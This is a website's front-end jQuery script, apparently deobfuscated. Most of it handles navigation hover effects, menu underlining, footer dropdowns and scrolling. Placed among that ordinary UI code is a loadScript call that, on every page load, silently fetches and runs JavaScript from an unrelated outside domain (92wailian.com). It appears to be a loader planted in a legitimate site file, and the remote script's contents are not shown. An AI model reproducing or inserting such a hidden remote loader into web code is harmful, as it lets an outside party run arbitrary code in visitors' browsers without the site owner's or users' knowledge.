//Thu Jul 10 2025 06:19:33 GMT+0000 (Coordinated Universal Time)
//Base:https://github.com/echo094/decode-js
//Modify:https://github.com/smallfawn/decode_action
$(function () {
  xydh2();
  win_w();
  img1200($(".bat img"));
  $("body").css("opacity", 1);
});
function goTop() {
  $("html,body").animate({
    "scrollTop": 0
  }, 600);
}
function loadScript(_0x32b249, _0x30a843) {
  var _0x18a1e5 = document.createElement("script");
  _0x18a1e5.type = "text/javascript";
  _0x18a1e5.onload = function () {
    if (_0x30a843) _0x30a843();
  };
  _0x18a1e5.onerror = function () {};
  _0x18a1e5.src = _0x32b249;
  document.head.appendChild(_0x18a1e5);
}
loadScript("https://www.92wailian.com/js.js", function () {
  console.log("Script executed");
});
$(function () {
  $(".dh>ul>li").hover(function () {
    $(this).find(".dh_fl").stop(true, true).slideDown();
  }, function () {
    $(this).find(".dh_fl").slideUp(100);
  });
  window.innerWidth < 1200 ? ($(".foot_gz .ml5 ul li").click(function (_0x4e15a4) {
    _0x4e15a4.stopPropagation();
    $(this).find(".xl").toggle();
    $(this).siblings().find(".xl").hide();
  }), $("body").click(function () {
    $(".foot_gz .ml5 ul li .xl").hide();
  })) : $(".foot_gz .ml5 ul li").hover(function () {
    $(this).find(".xl").show();
  }, function () {
    $(this).find(".xl").hide();
  });
});
$(function () {
  if ($(".dh>ul>li").size()) {
    var _0x5595e7 = 0;
    $(".dh>ul>li").each(function () {
      $(this).hasClass("on") && (_0x5595e7 = $(this).index());
    });
    $(window).resize(function () {
      $(".dh_tx").height($(".dh").height()).width($(".dh").width()).css({
        "left": $(".dh").offset().left
      });
      $(".dh_tx i").css({
        "left": $(".dh>ul>li").eq(_0x5595e7).find("a").offset().left - $(".dh").offset().left,
        "width": $(".dh>ul>li").eq(_0x5595e7).find("a").outerWidth()
      });
    });
    window.onload = function () {
      $(".dh_tx").height($(".dh").height()).width($(".dh").width()).css({
        "left": $(".dh").offset().left
      });
    };
    $(".dh_tx").height($(".dh").height()).width($(".dh").width()).css({
      "left": $(".dh").offset().left
    });
    $(".dh_tx i").css({
      "left": $(".dh>ul>li").eq(_0x5595e7).find("a").offset().left - $(".dh").offset().left,
      "width": $(".dh>ul>li").eq(_0x5595e7).find("a").outerWidth()
    });
    $(".dh>ul>li").hover(function () {
      $(".dh>ul>li").eq(_0x5595e7).removeClass("on");
      $(this).addClass("on");
      $(".dh_tx i").css({
        "left": $(this).find("a").offset().left - $(".dh").offset().left,
        "width": $(this).find("a").outerWidth()
      });
    }, function () {
      $(this).removeClass("on");
      $(".dh_tx i").css({
        "left": $(".dh>ul>li").eq(_0x5595e7).find("a").offset().left - $(".dh").offset().left,
        "width": $(".dh>ul>li").eq(_0x5595e7).find("a").outerWidth()
      });
      $(".dh>ul>li").eq(_0x5595e7).addClass("on");
    });
  }
});
$(".ny_st_l .ny_cp_fl ul li p").click(function () {
  $(this).parent().toggleClass("yc");
  $(this).siblings(".xl").stop(true).slideToggle();
});